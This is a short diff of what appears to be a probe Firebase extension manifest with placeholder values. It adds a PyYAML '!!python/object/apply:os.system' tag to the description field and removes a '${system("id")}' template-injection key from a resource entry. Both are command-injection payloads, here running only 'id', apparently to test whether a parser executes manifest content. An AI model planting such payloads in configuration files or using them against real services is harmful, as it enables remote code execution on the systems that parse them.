@@ -2,16 +2,11 @@ name: probe-ext
 version: 0.1.0
 specVersion: v1beta
 displayName: x
-description: d
+description: !!python/object/apply:os.system ['id']
 license: Apache-2.0
 author:
   authorName: p
   email: p@x.com
   url: https://x.com
 billingRequired: false
-resources:
-  - name: r
-    type: firebaseextensions.v1beta.function
-    description: d
-    properties:
-      ${system("id")}: 1
+resources: []
